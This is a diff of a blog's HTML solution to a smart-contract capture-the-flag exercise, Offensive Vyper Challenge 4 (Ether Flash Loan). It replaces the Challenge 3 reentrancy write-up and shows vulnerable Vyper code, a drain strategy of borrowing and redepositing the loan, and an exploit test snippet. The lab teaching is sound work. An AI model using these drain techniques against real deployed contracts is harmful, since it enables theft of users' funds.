@@ -4,34 +4,34 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Offensive Vyper - Challenge 3 - Ether Vault - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Offensive Vyper - Challenge 3 - Ether Vault" />
-<meta property="og:description" content="Solution for &ldquo;Offensive Vyper - Challenge 3 - Ether Vault&rdquo;." />
+        <title>Offensive Vyper - Challenge 4 - Ether Flash Loan - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Offensive Vyper - Challenge 4 - Ether Flash Loan" />
+<meta property="og:description" content="Solution for &ldquo;Offensive Vyper - Challenge 4 - Ether Flash Loan&rdquo;." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://dellalibera.github.io/posts/offensivevyper_03_ethervault/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2022-09-29T00:00:00+00:00" />
-<meta property="article:modified_time" content="2022-09-29T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/offensivevyper_04_etherflashloan/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-01T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://dellalibera.github.io"/>
 
-<meta name="twitter:title" content="Offensive Vyper - Challenge 3 - Ether Vault"/>
-<meta name="twitter:description" content="Solution for &ldquo;Offensive Vyper - Challenge 3 - Ether Vault&rdquo;."/>
+<meta name="twitter:title" content="Offensive Vyper - Challenge 4 - Ether Flash Loan"/>
+<meta name="twitter:description" content="Solution for &ldquo;Offensive Vyper - Challenge 4 - Ether Flash Loan&rdquo;."/>
 <meta name="application-name" content="della&#39;s blog">
 <meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/offensivevyper_03_ethervault/" /><link rel="prev" href="https://dellalibera.github.io/posts/offensivevyper_02_coinflipper/" /><link rel="next" href="https://dellalibera.github.io/posts/offensivevyper_04_etherflashloan/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/offensivevyper_04_etherflashloan/" /><link rel="prev" href="https://dellalibera.github.io/posts/offensivevyper_03_ethervault/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Offensive Vyper - Challenge 3 - Ether Vault",
+        "headline": "Offensive Vyper - Challenge 4 - Ether Flash Loan",
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_03_ethervault\/"
-        },"genre": "posts","keywords": "Offensive Vyper, CTF, Vyper, Blockchain","wordcount":  516 ,
-        "url": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_03_ethervault\/","datePublished": "2022-09-29T00:00:00+00:00","dateModified": "2022-09-29T00:00:00+00:00","publisher": {
+            "@id": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_04_etherflashloan\/"
+        },"genre": "posts","keywords": "Offensive Vyper, CTF, Vyper, Blockchain","wordcount":  784 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_04_etherflashloan\/","datePublished": "2022-10-01T00:00:00+00:00","dateModified": "2022-10-01T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
@@ -67,10 +67,10 @@
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title">Offensive Vyper - Challenge 3 - Ether Vault</h1><div class="post-meta">
+        </div><article class="page single"><h1 class="single-title">Offensive Vyper - Challenge 4 - Ether Flash Loan</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 29, 2022">September 29, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;516 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="October 1, 2022">October 1, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;784 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -84,19 +84,19 @@
     <li><a href="#4-references">4) References</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Offensive Vyper - Challenge 3 - Ether Vault&rdquo;.</div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Offensive Vyper - Challenge 4 - Ether Flash Loan&rdquo;.</div>
 <h2 id="1-challenge">1) Challenge</h2>
 <div class="details admonition quote open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
         </div>
         <div class="details-content">
-            <div class="admonition-content">The Ether Vault allows deposits and withdrawals. It currently holds 10 Ether. Your objective is to drain all of the Ether from the vault.</div>
+            <div class="admonition-content">The Ether Flash Loan contract allows liquidity providers deposit Ether. The Ether in the pool can be lent out in a flash loan. The receiver of the flash loan must expose a payable <code>execute()</code> function. By the end of <code>execute()</code>, the flash loan must be payed back. There is no fee. Your objective is to drain the flash loan pool, despite those pesky reentrancy guards.</div>
         </div>
     </div>
 <p>Challenge created by <a href="https://twitter.com/jtriley_eth" target="_blank" rel="noopener noreffer ">@jtriley_eth</a>.</p>
 <h2 id="2-code-review">2) Code Review</h2>
-<p><code>EtherVault.vy</code> contract (<a href="https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/ether-vault/EtherVault.vy" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<p><code>EtherFlashLoan.vy</code> contract (<a href="https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/ether-flash-loan/EtherFlashLoan.vy" target="_blank" rel="noopener noreffer ">source code</a>):</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -153,15 +153,39 @@
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># @version ^0.3.2</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@title Ether Liquidity Pool
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@title Ether Flash Loan Pool
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">@author jtriley.eth
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;</span>
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">interface</span> <span style="color:#000">IFlashLoanReceiver</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">def</span> <span style="color:#000">execute</span>(): <span style="color:#000">payable</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#000">event</span> <span style="color:#000">Deposit</span>:
 </span></span><span style="display:flex;"><span>    <span style="color:#000">account</span>: <span style="color:#000">indexed</span>(<span style="color:#000">address</span>)
@@ -177,94 +201,116 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@nonreentrant</span>(<span style="color:#5a2">&#39;deposit&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">deposit</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Deposits Ether.
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#000">unsafe_add</span>(<span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>], <span style="color:#000">msg</span>.<span style="color:#000">value</span>)
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] += <span style="color:#000">msg</span>.<span style="color:#000">value</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">Deposit</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">msg</span>.<span style="color:#000">value</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">withdraw</span>():
+</span></span><span style="display:flex;"><span><span style="color:#000">@nonreentrant</span>(<span style="color:#5a2">&#39;withdraw&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">withdraw</span>(<span style="color:#000">amount</span>: <span style="color:#000">uint256</span>):
 </span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Withdraws Ether.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param amount Withdrwawal amount.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @dev Throws when amount is gt than deposit.
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span> = <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#000">sender_deposit</span>: <span style="color:#000">uint256</span> = <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">sender_deposit</span> &gt;= <span style="color:#000">amount</span>, <span style="color:#5a2">&#34;not enough deposited&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#000">sender_deposit</span> - <span style="color:#000">amount</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#000">raw_call</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#5a2">b</span><span style="color:#5a2">&#34;&#34;</span>, <span style="color:#000">value</span>=<span style="color:#000">amount</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#3af">0</span>
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">Withdrawal</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@nonreentrant</span>(<span style="color:#5a2">&#39;flash_loan&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">flash_loan</span>(<span style="color:#000">amount</span>: <span style="color:#000">uint256</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Flash Loans to caller.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @param amount Amount to flash loan.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @dev Throws when insufficient balance OR flash loan isn&#39;t paid back.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">balance_before</span>: <span style="color:#000">uint256</span> = <span style="color:#000">self</span>.<span style="color:#000">balance</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">balance_before</span> &gt;= <span style="color:#000">amount</span>, <span style="color:#5a2">&#34;not enough balance&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">IFlashLoanReceiver</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">execute</span>(<span style="color:#000">value</span>=<span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">self</span>.<span style="color:#000">balance</span> &gt;= <span style="color:#000">balance_before</span>, <span style="color:#5a2">&#34;flash loan not paid back&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
 </span></span><span style="display:flex;"><span><span style="color:#000">@payable</span>
 </span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__default__</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#5a2">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice Receives Ether as Deposit.
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">    @notice For paying back flash loans ONLY.
 </span></span></span><span style="display:flex;"><span><span style="color:#5a2">    &#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#000">unsafe_add</span>(<span style="color:#000">self</span>.<span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>], <span style="color:#000">msg</span>.<span style="color:#000">value</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">Deposit</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">msg</span>.<span style="color:#000">value</span>)</span></span></code></pre></td></tr></table>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">pass</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
 <p>Contract main functions:</p>
 <ul>
-<li>
-<p><code>deposit</code> and the fallback function <code>__default__</code> update the public variable <code>deposits</code> (a HashMap that holds the balances of different accounts), incrementing the balance of the account that calls the function (line 27 and line 52)</p>
-</li>
-<li>
-<p><code>withdraw</code> takes the value from the <code>deposits</code> variable (line 37), sends this value  to <code>msg.sender</code> and later set the <code>deposits</code> balance for <code>msg.sender</code> equals to <code>0</code></p>
-</li>
-</ul>
-<div class="details admonition question open">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Question<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">How can we drain all the ETH balance from the contract?</div>
-        </div>
-    </div>
-<p>The <code>withdraw</code> function is vulnerable to a reentrancy attack because it first sends ETH to the caller and only later updates their balance. It means we can call again the withdraw function (in our fallback function) and drain all the funds from the contract. It is possible because the variable used to determine the withdrawal amount, i.e. <code>deposits</code>, is only updated after the ETH are sent, so if we re-enter the function by calling again as soon as we receive some ETH, it will hold the same value again (so we&rsquo;ll receive the same amount). If we repeat these steps until the  <code>EtherVault</code> has funds, we can drain all its ether.</p>
-<h2 id="3-solution">3) Solution</h2>
-<p>The solution consists of four different steps:</p>
+<li><code>deposit</code> updates the accounting variable <code>deposits</code> with the <code>msg.value</code> deposited by the <code>msg.sender</code> (line <code>30</code>). It&rsquo;s a payable function</li>
+<li><code>withdraw</code> is responsible for withdrawing the amount requested:
 <ul>
-<li>send <code>1</code> ETH to our attack contract</li>
-<li>from our contract, deposit <code>1</code> ETH so that the <code>deposits</code> variable for our contract will hold <code>1</code> ETH</li>
-<li>call the <code>withdraw</code> function</li>
-<li>inside the <code>__default__</code> fallback function, call the <code>withdraw</code> function again until the <code>EtherVault</code> balance is greater than <code>0</code></li>
+<li>it accepts as input the amount to withdraw</li>
+<li>it retrieves the amount deposited for a given account (line <code>42</code>),</li>
+<li>it checks if the amount requested is less than the one deposited (line <code>44</code>)</li>
+<li>it updates the balance of <code>msg.sender</code> (line <code>46</code>)</li>
+<li>finally, it sends this amount to <code>msg.sender</code> (line <code>48</code>)</li>
 </ul>
-<p><code>ether-vault.challenge.js</code>:
+</li>
+<li><code>flash_loan</code> holds the logic for providing loans:
+<ul>
+<li>it accepts as input the loan amount</li>
+<li>it checks if the caller has enough balance (line <code>63</code>)</li>
+<li>it calls the <code>execute</code>, exposed by the receiver contract (line <code>65</code>)</li>
+<li>finally, it checks if the amount is paid it back (line <code>67</code>)</li>
+</ul>
+</li>
+</ul>
+<p>All these functions are decorated with <code>nonreentrant</code> meaning they&rsquo;re guarded against reentrancy attacks.</p>
+<p>To withdraw, we need first to have some amount deposited. The amount deposited is stored in the <code>deposits</code> variable inside the <code>deposit</code> function.</p>
+<p>So if we can deposit some ETH, we can later withdraw them. Of course, we can use the <code>flash_loan</code> function to request some ETH. Also, once we receive them, in the same transaction, we can <code>deposit</code> them. In this case, if we deposit the ETH borrowed, we both updates the <code>deposits</code> variable, but we also pay the loan back because the <code>deposit</code> function is a payable function. However, once we have paid back the loan, the <code>deposits</code> variable will still hold the amount we have deposited. So if we then call the <code>withdraw</code> function, the condition at line <code>44</code> will be true, and thus we will be able to steal all the account ETH.</p>
+<p>For a similar challenge, see THIS.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>The solution consists of the following steps:</p>
+<ul>
+<li>call the <code>flash_loan</code> function asking for <code>2 ETH</code> (the contract balance)</li>
+<li>inside the <code>execute</code> function, call the <code>deposit</code> function and deposit <code>2 ETH</code></li>
+<li>once the execution of the <code>flash_loan</code> is completed, we call the <code>withdraw</code> function in order to receive the ETH amount save in <code>deposits</code></li>
+</ul>
+<p><code>ether-flash-loan.challenge.js</code>:
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 <pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
 </span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// YOUR EXPLOIT HERE
 </span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">exploit</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;EtherVaultExploit&#39;</span>, <span style="color:#000">deployer</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">vault</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">exploit</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;EtherFlashLoanExploit&#39;</span>, <span style="color:#000">deployer</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">etherFlashLoan</span>.<span style="color:#000">address</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">exploit</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>({
-</span></span><span style="display:flex;"><span>            <span style="color:#000">value</span>: <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;1&#39;</span>)
-</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">exploit</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    })</span></span></code></pre></td></tr></table>
 </div>
 </div></p>
-<p><code>EtherVaultExploit.vy</code>:
+<p><code>EtherFlashLoanExploit.vy</code>:
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
 <table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -285,42 +331,66 @@
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
 </span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
